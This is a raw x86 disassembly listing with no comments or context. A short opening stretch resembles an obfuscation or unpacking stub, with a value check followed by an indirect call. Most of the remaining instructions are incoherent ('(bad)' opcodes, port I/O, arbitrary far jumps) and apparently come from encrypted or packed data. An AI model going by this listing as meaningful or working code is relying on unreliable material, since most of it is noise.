  40cb82:	aaa    
  40cb83:	xchg   bh,ah
  40cb85:	xor    bh,BYTE PTR [edx+0x5ef5f114]
  40cb8b:	sahf   
  40cb8c:	sahf   
  40cb8d:	fs ins BYTE PTR es:[edi],dx
  40cb8f:	xor    BYTE PTR [edx+edx*1+0x5ec0fa29],bl
  40cb96:	add    eax,esi
  40cb98:	imul   eax,DWORD PTR [edx]
  40cb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40cb9e:	xor    edx,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8-0x7d]
  40cbfc:	ret    0x59be
  40cbff:	bound  ecx,QWORD PTR [esi+edi*2+0x7e7c387e]
  40cc06:	jle    0x40cbfb
  40cc08:	jne    0x40cc6f
  40cc0a:	int    0x4
  40cc0c:	shr    DWORD PTR [eax-0x49be1137],cl
  40cc12:	addr16 mov ah,0x2a
  40cc15:	xor    edi,esi
  40cc17:	pop    edi
  40cc18:	in     eax,0xd8
  40cc1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc1b:	xchg   ebx,eax
  40cc1c:	repz in eax,dx
  40cc1e:	ds jl  0x40cbc8
  40cc21:	push   ebp
  40cc22:	mov    ah,0x53
  40cc24:	sub    esp,esi
  40cc26:	imul   esi,DWORD PTR [ebp+0x19],0xffffffb4
  40cc2a:	sbb    eax,0x4e5e1198
  40cc2f:	loop   0x40cc20
  40cc31:	jne    0x40cbd4
  40cc33:	xlat   BYTE PTR ds:[ebx]
  40cc34:	xor    dh,ah
  40cc36:	jns    0x40cbde
  40cc38:	in     al,0xb
  40cc3a:	push   0xffffffec
  40cc3c:	pop    es
  40cc3d:	and    eax,0xb9b83563
  40cc42:	sub    BYTE PTR ds:0xf900a8b5,ah
  40cc48:	fsubr  DWORD PTR [ecx]
  40cc4a:	mov    eax,ds:0x566c7c20
  40cc4f:	jae    0x40cc16
  40cc51:	loop   0x40cc6c
  40cc53:	mov    cl,0xed
  40cc55:	ret    0xaa74
  40cc58:	adc    DWORD PTR [edi-0x16],ecx
  40cc5b:	xchg   esi,eax
  40cc5c:	xchg   DWORD PTR [ebx-0x4c],esi
  40cc5f:	pop    ebx
  40cc60:	or     ch,bh
  40cc62:	or     dl,BYTE PTR [esi+0x30]
  40cc65:	jae    0x40cc9d
  40cc67:	push   ds
  40cc68:	call   0xf48815b
  40cc6d:	sub    al,0x8
  40cc6f:	push   edi
  40cc70:	repz adc bl,bh
  40cc73:	pop    edx
  40cc74:	in     al,dx
  40cc75:	sub    al,0x82
  40cc77:	mov    ecx,0x96e3be9f
  40cc7c:	sbb    al,0xaf
  40cc7e:	ja     0x40cc64
  40cc80:	sbb    bh,BYTE PTR [edx-0x7ad5abb9]
  40cc86:	mov    ecx,0xc677405
  40cc8b:	repz mov esp,0xa1ce9870
  40cc91:	ds in  al,0x1c
  40cc94:	or     esp,DWORD PTR [ebp+ebp*1+0x609e2ebe]
  40cc9b:	xor    ebp,DWORD PTR [ecx+0x226f9d1c]
  40cca1:	retf   
  40cca2:	inc    esi
  40cca3:	push   ss
  40cca4:	mov    dl,0xc1
  40cca6:	ins    BYTE PTR es:[edi],dx
  40cca7:	add    ah,BYTE PTR [ebp-0x6d]
  40ccaa:	mov    ds:0x4ea766e9,al
  40ccaf:	xchg   edx,eax
  40ccb0:	dec    eax
  40ccb1:	xchg   edi,eax
  40ccb2:	es std 
  40ccb4:	mov    ecx,0x38610e7f
  40ccb9:	jecxz  0x40cc7f
  40ccbb:	or     ebx,DWORD PTR [ebp-0xf]
  40ccbe:	icebp  
  40ccbf:	mov    edi,0x9cc3dca5
  40ccc4:	jo     0x40cca8
  40ccc6:	ja     0x40ccc5
  40ccc8:	adc    edx,ebp
  40ccca:	xchg   BYTE PTR [ebx+0x12997598],ah
  40ccd0:	mov    ebp,0x87263535
  40ccd5:	test   esp,ebx
  40ccd7:	sbb    BYTE PTR [edi-0x23],ah
  40ccda:	retf   
  40ccdb:	test   DWORD PTR [eax],edi
  40ccdd:	in     al,0x55
  40ccdf:	xchg   esp,eax
  40cce0:	repz int 0x34
  40cce3:	loop   0x40cc6b
  40cce5:	mov    ebx,0x3931aa94
  40ccea:	xor    ah,BYTE PTR [ebx-0x70]
  40cced:	mov    cl,0x63
  40ccef:	repnz cmp al,0xe
  40ccf2:	les    edx,FWORD PTR es:[eax]
  40ccf5:	push   eax
  40ccf6:	pop    ecx
  40ccf7:	jno    0x40cce6
  40ccf9:	mov    ds:0x1d7c3818,eax
  40ccfe:	sub    ebx,DWORD PTR [ebx-0x641558fa]
  40cd04:	jl     0x40ccb2
  40cd06:	stc    
  40cd07:	jae    0x40cca5
  40cd09:	cs cli 
  40cd0b:	sti    
  40cd0c:	pop    ecx
  40cd0d:	sub    BYTE PTR [edi+0x2ea19a5],dl
  40cd13:	mov    bh,0xed
  40cd15:	(bad)  
  40cd17:	imul   eax,DWORD PTR [ebx+edx*4-0x63],0x54423676
  40cd1f:	inc    esp
  40cd20:	clc    
  40cd21:	push   0xfccef96a
  40cd26:	mov    dh,cl
  40cd28:	or     eax,DWORD PTR [edx+0x57]
  40cd2b:	ins    DWORD PTR es:[edi],dx
  40cd2c:	arpl   WORD PTR [edx-0x249e4d74],dx
  40cd32:	pop    esp
  40cd33:	fisttp QWORD PTR [edi]
  40cd35:	xchg   ecx,eax
  40cd36:	mov    eax,0x61e12e60
  40cd3b:	and    BYTE PTR [ebp+0x510c4737],bh
  40cd41:	in     al,0x59
  40cd43:	in     al,dx
  40cd44:	mov    dh,0x71
  40cd46:	add    DWORD PTR [ebp+0xb72c632],0xd654bd5d
  40cd50:	jmp    0x4bc6:0x26e425f2
  40cd57:	mov    dl,0x54
  40cd59:	clc    
  40cd5a:	fucomip st,st(7)
  40cd5c:	cmp    BYTE PTR [ebx+0x6af94451],0xd
  40cd63:	sub    al,0x63
  40cd65:	or     DWORD PTR [edi-0x552e234b],ebx
  40cd6b:	std    
  40cd6c:	adc    al,0xb
  40cd6e:	mov    edi,0x33b5eb46
  40cd73:	shl    BYTE PTR [edi-0x5e],0xff
  40cd77:	xchg   esp,eax
  40cd78:	pop    ebp
  40cd79:	add    edx,edx
  40cd7b:	mov    esp,esi
  40cd7d:	xchg   BYTE PTR [edi+ecx*4+0x39c4d676],dl
  40cd84:	mov    ah,0xa7
  40cd86:	loopne 0x40cd90
  40cd88:	or     DWORD PTR [ebx+0x66579713],edi
  40cd8e:	inc    edx
  40cd8f:	xchg   BYTE PTR [ecx],ch
  40cd91:	cwde   
  40cd92:	pop    ebp
  40cd93:	clc    
  40cd94:	adc    al,0xe7
  40cd96:	xchg   edi,eax
  40cd97:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40cd99:	cli    
  40cd9a:	xchg   edx,esp
  40cd9c:	mov    ds:0xf6fded16,eax
  40cda1:	push   0xffffffc0
  40cda3:	jo     0x40cd35
  40cda5:	js     0x40cd96
  40cda7:	push   ds
  40cda8:	pop    ss
  40cda9:	cs stos DWORD PTR es:[edi],eax
  40cdab:	ins    DWORD PTR es:[edi],dx
  40cdac:	push   edi
  40cdad:	and    edx,0x4719262
  40cdb3:	pop    ebp
  40cdb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdb5:	outs   dx,DWORD PTR ds:[esi]
  40cdb6:	mov    ch,0xc1
  40cdb8:	or     DWORD PTR [eax+0x3239af8f],0xffffff8f
  40cdbf:	call   0x4c5f:0x122a87cd
  40cdc6:	inc    esi
  40cdc7:	pop    ecx
  40cdc8:	js     0x40cd9e
  40cdca:	mov    bh,cl
  40cdcc:	sub    BYTE PTR [ecx],0x43
  40cdcf:	inc    eax
  40cdd0:	inc    ebx
  40cdd1:	jo     0x40ce15
  40cdd3:	xlat   BYTE PTR ds:[ebx]
  40cdd4:	adc    al,0xee
  40cdd6:	pop    edi
  40cdd7:	push   eax
  40cdd8:	dec    ebp
  40cdd9:	shl    BYTE PTR [edx],1
  40cddb:	push   ebp
  40cddc:	cmp    al,0x51
  40cdde:	retf   
  40cddf:	int3   
  40cde0:	sbb    al,0x53
  40cde2:	xchg   esp,eax
  40cde3:	jl     0x40cdf9
  40cde5:	pop    ecx
  40cde6:	dec    eax
  40cde7:	xchg   ecx,eax
  40cde8:	mov    edi,?
  40cdea:	jb     0x40cde7
  40cdec:	fisubr WORD PTR [edx+0x5a]
  40cdef:	pop    es
  40cdf0:	mov    ch,0xa5
  40cdf2:	cmp    edx,eax
  40cdf4:	and    bl,0xf0
  40cdf7:	add    al,0x20
  40cdf9:	stos   DWORD PTR es:[edi],eax
  40cdfa:	xor    ah,BYTE PTR ds:0x67ee34a6
  40ce00:	xor    DWORD PTR [edi+ebp*1+0x2cb1d5eb],ebp
  40ce07:	fwait
  40ce08:	sub    edi,DWORD PTR [eax-0xb]
  40ce0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce0c:	push   0x18
  40ce0e:	jb     0x40cdb2
  40ce10:	fldcw  WORD PTR [edx]
  40ce12:	gs iret 
  40ce14:	ffreep st(3)
  40ce16:	aam    0x69
  40ce18:	in     al,0xdb
  40ce1a:	push   edx
  40ce1b:	inc    eax
  40ce1c:	mov    esp,0x6f82c7d5
  40ce21:	jmp    0x19b1:0x131256ab
  40ce28:	test   al,0x51
  40ce2a:	jge    0x40ce53
  40ce2c:	add    bl,BYTE PTR [eax+edi*2]
  40ce2f:	dec    esp
  40ce30:	jp     0x40cdfb
  40ce32:	mov    esi,ds
  40ce34:	mov    esp,fs
  40ce36:	cld    
  40ce37:	iret   
  40ce38:	push   ecx
  40ce39:	mov    esp,0x3fe33f2a
  40ce3e:	xchg   edx,eax
  40ce3f:	addr16 mov bl,0x7f
  40ce42:	aas    
  40ce43:	pop    edi
  40ce44:	mov    edi,0xc0efce3
  40ce49:	jb     0x40ce28
  40ce4b:	daa    
  40ce4c:	pop    ecx
  40ce4d:	sub    ebx,ecx
  40ce4f:	xchg   ebx,ecx
  40ce51:	jmp    0x40d0b4
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	sub    bh,bh
  40ce64:	mov    WORD PTR [edi+0x7e7e8b2c],ds
  40ce6a:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ce6e:	test   DWORD PTR [ebx-0x8],0xeda65057
  40ce75:	fadd   QWORD PTR [eax-0x484c510c]
  40ce7b:	mov    ds:0x44c4e255,eax
  40ce80:	loope  0x40ce77
  40ce82:	cs dec eax
  40ce84:	pop    edi
  40ce85:	or     DWORD PTR [ebx+0x4b],edx
  40ce88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce8a:	out    0x75,eax
  40ce8c:	popf   
  40ce8d:	or     DWORD PTR [edx+0x1b],ecx
  40ce90:	repz mov esi,0xf60d974f
  40ce96:	sub    DWORD PTR [ebp-0x1921568c],0xfffffffb
  40ce9d:	je     0x40ce39
  40ce9f:	jb     0x40ceb8
  40cea1:	and    bl,BYTE PTR [ecx]
  40cea3:	out    0xd7,eax
  40cea5:	jle    0x40ce9e
  40cea7:	lods   al,BYTE PTR ds:[esi]
  40cea8:	ss aam 0xc8
  40ceab:	cmp    al,0x77
  40cead:	lea    edi,[esi+0x12]
  40ceb0:	mov    al,ds:0x3be38ad6
  40ceb5:	fimul  WORD PTR [esi-0xfebb1f6]
  40cebb:	stos   DWORD PTR es:[edi],eax
  40cebc:	mov    BYTE PTR [esi+0x5e],0x1
  40cec0:	out    0xbd,al
  40cec2:	out    dx,al
  40cec3:	aad    0xaa
  40cec5:	out    0x21,eax
  40cec7:	pop    esi
  40cec8:	mov    ch,0x27
  40ceca:	jmp    FWORD PTR [edi+eax*2+0x5722efe3]
  40ced1:	mov    eax,0xaf3e8dfc
  40ced6:	mov    ds:0x37397f17,al
  40cedb:	dec    edx
  40cedc:	push   esi
  40cedd:	xchg   esi,eax
  40cede:	inc    ecx
  40cedf:	adc    ch,BYTE PTR [eax+0x73]
  40cee2:	cwde   
  40cee3:	std    
  40cee4:	mov    ds:0xdba9315d,eax
  40cee9:	sti    
  40ceea:	mov    al,ds:0xbfa5a793
  40ceef:	and    DWORD PTR [ecx],ebp
  40cef1:	mov    esi,0x5faa5f16
  40cef6:	sbb    BYTE PTR [edx+0xf781a9f],cl
  40cefc:	push   0xa27f9659
  40cf01:	push   esi
  40cf02:	cli    
  40cf03:	sub    BYTE PTR [ebp+0x60f816d4],dh
  40cf09:	fdiv   QWORD PTR [ecx-0x16]
  40cf0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf0d:	mov    DWORD PTR [ebx],0xd8425521
  40cf13:	mov    ah,0x58
  40cf15:	sahf   
  40cf16:	sub    DWORD PTR [ebx+0x25],ebx
  40cf19:	lods   eax,DWORD PTR ds:[esi]
  40cf1a:	fdiv   QWORD PTR [eax-0x13]
  40cf1d:	test   bl,0x91
  40cf20:	in     al,0xa
  40cf22:	mov    DWORD PTR [ebx-0x75348a83],ebx
  40cf28:	adc    eax,0x476c3921
  40cf2d:	mov    eax,ds:0x45fd63a4
  40cf32:	sbb    al,0x58
  40cf34:	repnz and al,0xa2
  40cf37:	das    
  40cf38:	push   0xffffffc1
  40cf3a:	imul   ebp,DWORD PTR [ecx+0x20],0x34525115
  40cf41:	pslld  mm5,QWORD PTR [ecx+ebp*4+0x4525d60]
  40cf49:	fucomp st(2)
  40cf4b:	or     ecx,ebx
  40cf4d:	stos   BYTE PTR es:[edi],al
  40cf4e:	daa    
  40cf4f:	adc    al,0xe2
  40cf51:	(bad)  
  40cf52:	fcomp  st(4)
  40cf54:	cwde   
  40cf55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf56:	jle    0x40cf59
  40cf58:	bound  esp,QWORD PTR [esi]
  40cf5a:	push   0x4a537163
  40cf5f:	iret   
  40cf60:	lgs    ebx,FWORD PTR [edx+ebp*4-0x115f0310]
  40cf68:	in     eax,0xb1
  40cf6a:	mov    eax,ds:0x26bb17b
  40cf6f:	push   ecx
  40cf70:	gs jmp ecx
  40cf73:	mov    ah,0x92
  40cf75:	lods   al,BYTE PTR ds:[esi]
  40cf76:	fiadd  DWORD PTR [eax-0x1340857e]
  40cf7c:	mov    esp,0xd64b2a32
  40cf81:	jecxz  0x40cf37
  40cf83:	inc    esp
  40cf84:	xchg   ebp,eax
  40cf85:	push   eax
  40cf86:	mov    edi,0x78c92bdd
  40cf8b:	lock sbb eax,0xa806b3b6
  40cf92:	push   es
  40cf93:	fst    QWORD PTR [ecx]
  40cf95:	mov    eax,0x79c27936
  40cf9a:	add    ah,al
  40cf9c:	dec    eax
  40cf9d:	xlat   BYTE PTR ds:[ebx]
  40cf9e:	je     0x40cfae
  40cfa0:	jmp    0x40cf96
  40cfa2:	lea    esp,[edi+0x4e]
  40cfa5:	rol    BYTE PTR [esi],cl
  40cfa7:	test   eax,0xda6f0877
  40cfac:	lods   al,BYTE PTR ds:[esi]
  40cfad:	call   0x9000e6d1
  40cfb2:	mov    dh,0x84
  40cfb4:	push   0xc
  40cfb6:	jl     0x40cf6a
  40cfb8:	sbb    DWORD PTR [eax-0x26],ebp
  40cfbb:	push   ebx
  40cfbc:	pushf  
  40cfbd:	nop
  40cfbe:	cwde   
  40cfbf:	rcl    BYTE PTR [edx+0xee6190c],0x75
  40cfc6:	ffree  st(7)
  40cfc8:	mov    ecx,0x12d9e368
  40cfcd:	loope  0x40d040
  40cfcf:	or     eax,ebx
  40cfd1:	fadd   QWORD PTR [edx+0x6a696c22]
  40cfd7:	or     DWORD PTR [ecx],esp
  40cfd9:	push   ss
  40cfda:	sub    BYTE PTR [eax-0x280f4b87],dl
  40cfe0:	and    DWORD PTR [ebp-0x71],edi
  40cfe3:	sub    edx,DWORD PTR [ecx-0x1e564821]
  40cfe9:	sub    al,0xe5
  40cfeb:	std    
  40cfec:	adc    bl,BYTE PTR [edi+0x3a]
  40cfef:	retf   
  40cff0:	cmp    esi,DWORD PTR cs:[ebx+0x58]
  40cff4:	lods   eax,DWORD PTR ds:[esi]
  40cff5:	push   edi
  40cff6:	test   BYTE PTR [ebx],ch
  40cff8:	push   cs
  40cff9:	enter  0x7678,0xe0
  40cffd:	pushf  
  40cffe:	jg     0x40cfee
  40d000:	cmp    esp,DWORD PTR [ebp-0x2b]
  40d003:	jge    0x40d080
  40d005:	mov    ch,0x2a
  40d007:	jmp    0x40d087
  40d009:	xor    dh,BYTE PTR [ebp-0x54fc9484]
  40d00f:	add    ebp,DWORD PTR [esi+0x6df59393]
  40d015:	cdq    
  40d016:	jecxz  0x40d015
  40d018:	mov    ah,dl
  40d01a:	std    
  40d01b:	mov    eax,0x8ea85f88
  40d020:	xchg   esi,eax
  40d021:	and    al,0xa0
  40d023:	stos   BYTE PTR es:[edi],al
  40d024:	sub    bl,ah
  40d026:	shr    BYTE PTR [edx],1
  40d028:	xor    eax,0x59ddfe26
  40d02d:	dec    ebp
  40d02e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d02f:	xor    dh,BYTE PTR [esi-0x41]
  40d032:	push   esi
  40d033:	popa   
  40d034:	stos   BYTE PTR es:[edi],al
  40d035:	mov    al,0x92
  40d037:	and    bl,bl
  40d039:	add    edx,edx
  40d03b:	sahf   
  40d03c:	pop    edx
  40d03d:	add    al,0x5
  40d03f:	mov    ecx,DWORD PTR [ebp-0x76]
  40d042:	rcl    DWORD PTR [ebp+ebx*8-0x4f68a7de],0x84
  40d04a:	enter  0x2a12,0x9d
  40d04e:	imul   eax,DWORD PTR [edi],0x65
  40d051:	adc    eax,0xde669dd8
  40d056:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d057:	mov    edi,0x9cf37290
  40d05c:	(bad)  
  40d05d:	and    dh,cl
  40d05f:	push   ebx
  40d060:	pop    ebp
  40d061:	(bad)  
  40d063:	(bad)  
  40d064:	and    eax,0xb727d48b
  40d069:	nop
  40d06a:	loopne 0x40d05b
  40d06c:	and    eax,0xc405daf2
  40d071:	cmp    bh,bl
  40d073:	mov    esp,0xe221caa6
  40d078:	push   cs
  40d079:	or     bh,BYTE PTR [esi+0x8]
  40d07c:	mov    bl,0xb
  40d07e:	inc    eax
  40d07f:	xlat   BYTE PTR ds:[ebx]
  40d080:	sbb    DWORD PTR [ecx+0x11849012],0x32
  40d087:	or     al,0x93
  40d089:	dec    esi
  40d08a:	mov    ah,BYTE PTR [ecx+edi*8+0x5d94d220]
  40d091:	mov    dl,0x1d
  40d093:	ror    esi,0x63
  40d096:	dec    edi
  40d097:	(bad)  
  40d098:	aaa    
  40d099:	ret    0x997c
  40d09c:	xchg   DWORD PTR [ebx+0x27],ebx
  40d09f:	sti    
  40d0a0:	bnd jns 0x40d0e7
  40d0a3:	shl    BYTE PTR [ebp-0x66a3a71],0xa5
  40d0aa:	test   BYTE PTR [eax],bh
  40d0ac:	jno    0x40d08a
  40d0ae:	into   
  40d0af:	jae    0x40d0c9
  40d0b1:	jg     0x40d0da
  40d0b3:	or     al,0x49
  40d0b5:	mov    eax,DWORD PTR [ebp-0x1c]
  40d0b8:	imul   eax,ecx
  40d0bb:	add    esp,eax
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	push   edx
  40d0d0:	adc    eax,0x89f69f5d
  40d0d5:	jle    0x40d155
  40d0d7:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d0db:	cdq    
  40d0dc:	adc    ah,ch
  40d0de:	stos   BYTE PTR es:[edi],al
  40d0df:	mov    ecx,0xa239a835
  40d0e4:	push   ebx
  40d0e5:	xchg   ebp,eax
  40d0e6:	out    dx,eax
  40d0e7:	lods   eax,DWORD PTR ds:[esi]
  40d0e8:	xchg   esp,eax
  40d0e9:	dec    ebx
  40d0ea:	jbe    0x40d075
  40d0ec:	push   edi
  40d0ed:	inc    edi
  40d0ee:	mov    edi,0xac9097c6
  40d0f3:	inc    ebp
  40d0f4:	lods   al,BYTE PTR ds:[esi]
  40d0f5:	xchg   edx,eax
  40d0f6:	cmp    al,BYTE PTR [edx-0x1c43e5fd]
  40d0fc:	and    cl,BYTE PTR [eax]
  40d0fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0ff:	xchg   esp,eax
  40d100:	dec    esp
  40d101:	rcr    BYTE PTR [ebx-0x3c],cl
  40d104:	mov    dl,BYTE PTR [edx]
  40d106:	jmp    0x3027a08d
  40d10b:	call   0x5bdb3ed4
  40d110:	stc    
  40d111:	sbb    ebp,DWORD PTR [edx-0x517bc144]
  40d117:	daa    
  40d118:	sahf   
  40d119:	ret    
  40d11a:	xor    esi,esi
  40d11c:	dec    esi
  40d11d:	(bad)  
  40d11e:	and    ecx,DWORD PTR [ebx]
  40d120:	pop    esi
  40d121:	out    0x3a,al
  40d123:	xchg   edi,eax
  40d124:	mov    bh,0xfd
  40d126:	sbb    BYTE PTR [edx-0x74],al
  40d129:	mov    eax,ds:0x83a86a6f
  40d12e:	jbe    0x40d116
  40d130:	ins    BYTE PTR es:[edi],dx
  40d131:	ficomp WORD PTR [esi+0x79275791]
  40d137:	mov    edi,0x39682832
  40d13c:	xor    ch,BYTE PTR [ecx]
  40d13e:	inc    edi
  40d13f:	cld    
  40d140:	inc    edx
  40d141:	jb     0x40d17a
  40d143:	es jg  0x40d0cd
  40d146:	shl    BYTE PTR [edx+0x72],cl
  40d149:	xchg   DWORD PTR [ebx-0x64f377a7],eax
  40d14f:	ret    
  40d150:	fxam   
  40d152:	popa   
  40d153:	nop
  40d154:	xchg   edi,eax
  40d155:	dec    bx
  40d157:	mov    ah,0xd4
  40d159:	lods   eax,DWORD PTR ds:[esi]
  40d15a:	dec    ebp
  40d15b:	(bad)  
  40d15c:	iret   
  40d15d:	pop    edx
  40d15e:	cmc    
  40d15f:	and    BYTE PTR ds:0xf0926ede,ah
  40d165:	sahf   
  40d166:	cs jo  0x40d1c2
  40d169:	sub    BYTE PTR [ebp+0x34b8b9c4],dh
  40d16f:	test   dh,dl
  40d171:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d172:	adc    DWORD PTR [esi-0x61],ebx
  40d175:	(bad)  
  40d176:	xor    al,0xcf
  40d178:	or     BYTE PTR [ebp-0x727b4948],cl
  40d17e:	and    DWORD PTR [ebx+0x54c487e2],0xf9a8636e
  40d188:	push   ds
  40d189:	cmp    al,0x1
  40d18b:	adc    BYTE PTR [ebp-0x47ad39ee],dh
  40d191:	mov    esp,0x3b7d5197
  40d196:	xor    dl,BYTE PTR [esi]
  40d198:	push   ss
  40d199:	psubusb mm2,QWORD PTR [edi-0x1be14f19]
  40d1a0:	pop    edi
  40d1a1:	les    esi,FWORD PTR [edx-0x2a]
  40d1a4:	mov    edi,0x3c91d203
  40d1a9:	jno    0x40d1b7
  40d1ab:	aam    0x47
  40d1ad:	adc    WORD PTR [ebx-0x467819af],ax
  40d1b4:	dec    esp
  40d1b5:	(bad)  
  40d1b6:	scas   eax,DWORD PTR es:[edi]
  40d1b7:	enter  0x8e5f,0x61
  40d1bb:	inc    ebx
  40d1bc:	mov    dl,0xb0
  40d1be:	stos   DWORD PTR es:[edi],eax
  40d1bf:	jnp    0x40d149
  40d1c1:	aas    
  40d1c2:	xor    BYTE PTR [esi-0x7f605f1f],0x87
  40d1c9:	jecxz  0x40d1d5
  40d1cb:	dec    esp
  40d1cc:	jno    0x40d168
  40d1ce:	mov    eax,ds:0xa8bc9a3e
  40d1d3:	leave  
  40d1d4:	pop    edx
  40d1d5:	(bad)  
  40d1d6:	mov    ds:0x78b0a49a,al
  40d1db:	mov    edx,ss
  40d1dd:	fsubr  QWORD PTR [edx-0x53b322d6]
  40d1e3:	xchg   ebx,eax
  40d1e4:	mov    ds:0x6d36a9d3,eax
  40d1e9:	xchg   BYTE PTR [esi+0xd],bl
  40d1ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1ed:	pop    ss
  40d1ee:	or     BYTE PTR [ecx],bh
  40d1f0:	pop    DWORD PTR [ecx+0x6a]
  40d1f3:	lea    edi,[ebx+0xb]
  40d1f6:	sbb    BYTE PTR [edi-0x51],bl
  40d1f9:	scas   al,BYTE PTR es:[edi]
  40d1fa:	int3   
  40d1fb:	xor    eax,0xcfcdc19f
  40d200:	sbb    eax,0x3bd6b5f
  40d205:	retf   
  40d206:	arpl   WORD PTR [ecx-0x59],di
  40d209:	rol    BYTE PTR [eax+0x38],1
  40d20c:	xchg   DWORD PTR [ebx],esi
  40d20e:	xor    edx,DWORD PTR [ebx+edx*2+0x1c56ae34]
  40d215:	data16 cld 
  40d217:	mov    ch,0x2c
  40d219:	xor    eax,0xdd8546d5
  40d21e:	push   ds
  40d21f:	xor    eax,0x89f3922e
  40d224:	stos   DWORD PTR es:[edi],eax
  40d225:	gs mov edx,0x5bfb85cd
  40d22b:	call   0x17c7:0x8b0c8869
  40d232:	add    eax,esi
  40d234:	int3   
  40d235:	inc    ebp
  40d236:	fsubr  DWORD PTR [esi-0x2a0c5dce]
  40d23c:	dec    esp
  40d23d:	mov    dh,0x74
  40d23f:	jmp    0xa6f9:0xbe116573
  40d246:	in     al,dx
  40d247:	retf   0x750c
  40d24a:	inc    ah
  40d24c:	push   0xffffffbb
  40d24e:	cmp    BYTE PTR [edx],al
  40d250:	mov    esp,0xa1a35b26
  40d255:	out    dx,eax
  40d256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d257:	xchg   edi,eax
  40d258:	mov    ch,0x8e
  40d25a:	test   al,0x6a
  40d25c:	scas   al,BYTE PTR es:[edi]
  40d25d:	dec    ebx
  40d25e:	xor    BYTE PTR [ecx+0x36fca951],dh
  40d264:	mov    dl,0xb6
  40d266:	push   edi
  40d267:	sti    
  40d268:	mov    bl,0x72
  40d26a:	scas   eax,DWORD PTR es:[edi]
  40d26b:	mov    al,0x85
  40d26d:	pop    edx
  40d26e:	call   0xeb44c630
  40d273:	hlt    
  40d274:	sub    eax,DWORD PTR [esi-0x3984e70d]
  40d27a:	pop    es
  40d27b:	sub    eax,0x3a3aeb0
  40d280:	sbb    BYTE PTR [eax],0x94
  40d283:	popa   
  40d284:	sbb    al,BYTE PTR [edx]
  40d286:	imul   edi,DWORD PTR [ecx+0x51],0xfcc40978
  40d28d:	lock sub al,0x22
  40d290:	mov    ds:0x2fc7292e,al
  40d295:	ja     0x40d21b
  40d297:	call   0xee93ac1a
  40d29c:	fcom   DWORD PTR [ecx+0xc]
  40d29f:	push   ebx
  40d2a0:	icebp  
  40d2a1:	jmp    0x6834d6da
  40d2a6:	lahf   
  40d2a7:	jl     0x40d235
  40d2a9:	inc    ecx
  40d2aa:	imul   edx,DWORD PTR [ebx+0x3d0ea39e],0x72f3bf77
  40d2b4:	mov    ebp,0x5eef89f6
  40d2b9:	hlt    
  40d2ba:	mov    dl,0xe8
  40d2bc:	in     eax,0xa3
  40d2be:	fistp  QWORD PTR [ebx]
  40d2c0:	(bad)  
  40d2c1:	pusha  
  40d2c2:	xor    BYTE PTR ds:0x75b614f1,dh
  40d2c8:	pop    ebx
  40d2c9:	mov    esp,0x328db8d
  40d2ce:	out    dx,al
  40d2cf:	daa    
  40d2d0:	xchg   esp,eax
  40d2d1:	cli    
  40d2d2:	rcl    DWORD PTR [ebx+esi*2],0x59
  40d2d6:	adc    al,0xad
  40d2d8:	mov    ss,WORD PTR [edi]
  40d2da:	rcl    DWORD PTR [ecx],cl
  40d2dc:	ret    0x4f30
  40d2df:	shr    DWORD PTR [eax-0x75],0x14
  40d2e3:	stos   BYTE PTR es:[edi],al
  40d2e4:	out    0x8,eax
  40d2e6:	cmp    DWORD PTR [ecx+0x199ab564],esp
  40d2ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2ed:	jae    0x40d2b6
  40d2ef:	sbb    eax,0x2fba9ed0
  40d2f4:	pop    edi
  40d2f5:	loopne 0x40d340
  40d2f7:	test   dh,al
  40d2f9:	ret    0x94e8
  40d2fc:	jmp    0x705f:0x29d792f7
  40d303:	sbb    DWORD PTR [eax+0x55f834a0],edi
  40d309:	int    0xe6
